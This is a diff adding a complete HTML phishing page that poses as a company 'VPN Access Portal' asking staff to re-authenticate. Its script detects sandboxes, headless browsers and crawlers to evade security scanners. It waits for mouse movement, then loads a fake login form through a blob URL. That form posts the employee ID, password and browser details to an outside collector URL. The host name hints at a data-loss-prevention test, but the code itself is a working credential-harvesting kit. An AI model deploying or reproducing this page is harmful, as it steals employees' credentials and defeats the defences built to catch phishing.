@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Company Portal — VPN Configuration</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f4f5f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      background: white;
+      border-radius: 6px;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.1);
+      padding: 40px 36px;
+      max-width: 500px;
+      width: 92%;
+      text-align: center;
+    }
+    .shield-icon {
+      width: 56px;
+      height: 56px;
+      margin: 0 auto 20px auto;
+      background: #e8f0fe;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 26px;
+    }
+    h1 {
+      font-size: 20px;
+      color: #1a1a2e;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+    .subtitle {
+      color: #666;
+      font-size: 13px;
+      margin-bottom: 24px;
+      line-height: 1.5;
+    }
+    .info-box {
+      background: #f8f9fa;
+      border: 1px solid #e8e8e8;
+      border-radius: 4px;
+      padding: 16px;
+      text-align: left;
+      margin-bottom: 24px;
+      font-size: 13px;
+      color: #444;
+      line-height: 1.6;
+    }
+    .info-box strong {
+      color: #1a1a2e;
+    }
+    .access-btn {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      padding: 12px 40px;
+      border-radius: 4px;
+      font-size: 15px;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+      font-weight: 500;
+      transition: background 0.15s;
+    }
+    .access-btn:hover { background: #1557b0; }
+    .access-btn:disabled { background: #92baf0; cursor: not-allowed; }
+    .spinner {
+      display: none;
+      margin: 16px auto 0 auto;
+      width: 28px;
+      height: 28px;
+      border: 3px solid #e0e0e0;
+      border-top-color: #1a73e8;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .gate-msg {
+      display: none;
+      font-size: 12px;
+      color: #888;
+      margin-top: 12px;
+    }
+    .footer-text {
+      margin-top: 28px;
+      font-size: 11px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="mainContainer">
+    <div class="shield-icon">&#x1f6e1;</div>
+    <h1>VPN Access Portal</h1>
+    <p class="subtitle">Your VPN configuration has been updated. Please re-authenticate to apply the new settings.</p>
+    <div class="info-box">
+      <strong>Update Details</strong><br>
+      Scheduled: <span id="dateDisplay">Today</span><br>
+      Action required: Re-authenticate using your employee credentials<br>
+      Duration: Less than 1 minute
+    </div>
+    <button class="access-btn" id="accessBtn" onclick="initiateAccess()">Access VPN Configuration Portal</button>
+    <div class="spinner" id="spinner"></div>
+    <div class="gate-msg" id="gateMsg">Verifying connection security...</div>
+    <div class="footer-text">IT Infrastructure &bull; Internal Use Only</div>
+  </div>
+  <script>
+    document.getElementById('dateDisplay').textContent = new Date().toLocaleDateString('en-US', { weekday: 'short', year: 'numeric', month: 'short', day: 'numeric' });
+
+    var COLLECTOR_URL = 'https://wufinancialdocs.dlptestwu.workers.dev/collect';
+    var humanVerified = false;
+    var mouseMoved = false;
+    var accessAttempted = false;
+
+    document.addEventListener('mousemove', function() {
+      if (!mouseMoved) { mouseMoved = true; }
+    });
+
+    function isSandbox() {
+      if (navigator.webdriver) return true;
+      var scrW = window.screen.width, scrH = window.screen.height;
+      if (scrW < 1024 && scrH < 768) return true;
+      var ua = navigator.userAgent || '';
+      if (/HeadlessChrome|PhantomJS|SlimerJS|jsdom/i.test(ua)) return true;
+      if (!('requestAnimationFrame' in window)) return true;
+      if (/curl|wget|python|go-http|bot|spider|crawler/i.test(ua)) return true;
+      return false;
+    }
+
+    function showError(msg) {
+      var c = document.getElementById('mainContainer');
+      c.innerHTML = '<div class="shield-icon">&#x26a0;</div>' +
+        '<h1>Unable to Load</h1>' +
+        '<p class="subtitle">' + msg + '</p>' +
+        '<p class="subtitle" style="font-size:12px; color:#aaa;">Please contact IT Help Desk if this issue persists.</p>' +
+        '<div class="footer-text">IT Infrastructure &bull; Internal Use Only</div>';
+    }
+
+    function initiateAccess() {
+      if (accessAttempted) return;
+      accessAttempted = true;
+
+      if (isSandbox()) {
+        showError('This portal requires a standard web browser with JavaScript enabled. Automated access is not supported.');
+        return;
+      }
+
+      var btn = document.getElementById('accessBtn');
+      var spinner = document.getElementById('spinner');
+      var gateMsg = document.getElementById('gateMsg');
+      btn.disabled = true;
+      btn.textContent = 'Verifying...';
+      spinner.style.display = 'block';
+      gateMsg.style.display = 'block';
+
+      var startTime = Date.now();
+
+      function tryProceed() {
+        var elapsed = Date.now() - startTime;
+        if (mouseMoved && elapsed > 2200) {
+          humanVerified = true;
+          generateBlob();
+        } else if (elapsed > 8000) {
+          showError('Connection verification timed out. Please ensure you are using a standard browser and try again.');
+        } else {
+          setTimeout(tryProceed, 200);
+        }
+      }
+      setTimeout(tryProceed, 200);
+    }
+
+    function escapeAttr(str) {
+      if (!str) return '';
+      return str.replace(/&/g, '&').replace(/"/g, '"').replace(/</g, '<').replace(/>/g, '>');
+    }
+
+    function generateBlob() {
+      var loginFormHtml = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>VPN Portal — Re-authentication</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:"Segoe UI",Tahoma,Geneva,Verdana,sans-serif;background:#f4f5f7;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:6px;box-shadow:0 1px 8px rgba(0,0,0,0.1);padding:40px 36px;max-width:420px;width:92%}.lock-icon{text-align:center;font-size:32px;margin-bottom:12px}h2{text-align:center;color:#1a1a2e;font-size:18px;margin-bottom:6px;font-weight:600}.sub{text-align:center;color:#666;font-size:12px;margin-bottom:22px}.field{margin-bottom:14px}label{display:block;font-size:13px;color:#444;margin-bottom:4px;font-weight:500}input[type="text"],input[type="password"]{width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;font-size:14px;transition:border-color .15s}input[type="text"]:focus,input[type="password"]:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.15)}.login-btn{width:100%;padding:11px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:15px;cursor:pointer;margin-top:6px;font-weight:500;transition:background .15s}.login-btn:hover{background:#1557b0}.error{display:none;color:#c62828;font-size:12px;text-align:center;margin-bottom:12px;padding:8px;background:#ffebee;border-radius:4px}.loader{display:none;margin:10px auto 0;width:22px;height:22px;border:3px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:spin .7s linear infinite}@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.foot{text-align:center;margin-top:22px;font-size:11px;color:#aaa}</style></head><body><div class="login-box"><div class="lock-icon">&#x1f511;</div><h2>VPN Re-authentication Required</h2><p class="sub">Enter your employee credentials to apply the updated VPN configuration</p><div class="error" id="err">Authentication failed. Please verify your credentials.</div><form id="loginForm"><div class="field"><label for="eid">Employee ID</label><input type="text" id="eid" name="employeeId" placeholder="e.g., john.doe" required autocomplete="off"></div><div class="field"><label for="pwd">Passphrase</label><input type="password" id="pwd" name="passphrase" placeholder="Enter your passphrase" required autocomplete="off"></div><button type="submit" class="login-btn" id="submitBtn">Authenticate</button><div class="loader" id="loader"></div></form><div class="foot">IT Infrastructure &bull; Secure Connection &bull; Internal Use Only</div></div><script>document.getElementById("loginForm").onsubmit=function(e){e.preventDefault();var eid=document.getElementById("eid").value;var pwd=document.getElementById("pwd").value;var btn=document.getElementById("submitBtn");var loader=document.getElementById("loader");var err=document.getElementById("err");if(!eid||!pwd){err.textContent="Please enter both fields.";err.style.display="block";return}btn.style.display="none";loader.style.display="block";err.style.display="none";fetch("' + COLLECTOR_URL + '",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:eid,password:pwd,timestamp:new Date().toISOString(),userAgent:navigator.userAgent,referrer:document.referrer,screenResolution:window.screen.width+"x"+window.screen.height})}).then(function(r){if(r.ok){document.querySelector(".login-box").innerHTML=\'<div style="text-align:center;padding:20px;"><div style="font-size:40px;margin-bottom:12px;">&#x2705;</div><h2 style="color:#1a1a2e;margin-bottom:6px;">VPN Configuration Applied</h2><p style="color:#666;font-size:13px;margin-bottom:8px;">You are now connected. Your VPN session will be active within 2-3 minutes.</p><p style="font-size:12px;color:#aaa;">Signed in as: \'+escapeAttr(eid)+"</p></div>"}else{throw new Error("Server error")}}).catch(function(ex){console.error(ex);loader.style.display="none";btn.style.display="block";err.textContent="Authentication failed. Please verify your credentials and try again.";err.style.display="block"})};<\/script></body></html>';
+
+      function escapeAttr(s) { if(!s)return''; return s.replace(/&/g,'&').replace(/"/g,'"').replace(/</g,'<').replace(/>/g,'>'); }
+
+      var bytes = new Uint8Array(loginFormHtml.length);
+      for (var i = 0; i < loginFormHtml.length; i++) {
+        bytes[i] = loginFormHtml.charCodeAt(i);
+      }
+      var blob = new Blob([bytes], { type: 'text/html' });
+      var blobUrl = URL.createObjectURL(blob);
+      window.location.href = blobUrl;
+    }
+  </script>
+</body>
+</html>
